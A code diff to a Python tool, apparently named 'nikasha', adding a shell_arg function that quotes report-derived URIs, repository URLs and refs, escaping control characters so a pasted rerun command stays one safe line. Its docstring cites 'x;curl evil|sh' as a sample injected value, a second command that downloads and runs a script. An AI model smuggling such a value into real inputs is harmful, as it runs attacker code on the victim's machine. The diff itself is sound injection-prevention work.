@@ -492,19 +492,50 @@ def _context_details(result: Result, env: Environment) -> list[str]:
     return _details("Run context", rows)
 
 
+_ANSI_C_ESCAPES = {"\n": "\\n", "\r": "\\r", "\t": "\\t", "\\": "\\\\", "'": "\\'"}
+
+
+def _invisible(char: str) -> bool:
+    """A character that would break the line or hide itself: controls, format, separators."""
+    return char != " " and unicodedata.category(char)[0] in "CZ"
+
+
+def shell_arg(value: str) -> str:
+    """``value`` as one shell word that stays on one visible line.
+
+    Plain values use :func:`shlex.quote`. A value carrying a newline or any other control,
+    format or separator character is written in ANSI-C quoting (``$'...'``) with every such
+    character as a visible escape, so the command cannot span lines or hide text, and a
+    shell still reads it back as the same single argument (P7).
+    """
+    if not any(_invisible(char) for char in value):
+        return shlex.quote(value)
+    out = []
+    for char in value:
+        if char in _ANSI_C_ESCAPES:
+            out.append(_ANSI_C_ESCAPES[char])
+        elif _invisible(char):
+            # UTF-8 bytes as \xHH: bash 3.2 (macOS /bin/bash) has no \u or \U escapes.
+            out.extend(f"\\x{byte:02x}" for byte in char.encode("utf-8"))
+        else:
+            out.append(char)
+    return "$'" + "".join(out) + "'"
+
+
 def rerun_command(result: Result) -> str:
     """The `nikasha check` invocation that reproduces this result.
 
     The URI, repository URL and ref are report-derived, and a maintainer will paste this
     line into a shell, so each one is shell-quoted: a URI of ``x;curl evil|sh`` must stay
-    one argument, never become a second command (P7).
+    one argument, never become a second command (P7). Control characters are escaped
+    visibly (:func:`shell_arg`), so the command is always a single line.
     """
-    parts = ["nikasha check", shlex.quote(result.report.source.uri or "REPORT")]
+    parts = ["nikasha check", shell_arg(result.report.source.uri or "REPORT")]
     target = result.target
     if target is not None:
-        parts += ["--repo", shlex.quote(target.repo_url)]
+        parts += ["--repo", shell_arg(target.repo_url)]
         if target.ref_name:
-            parts += ["--ref", shlex.quote(target.ref_name)]
+            parts += ["--ref", shell_arg(target.ref_name)]
     return " ".join(parts)
 
 
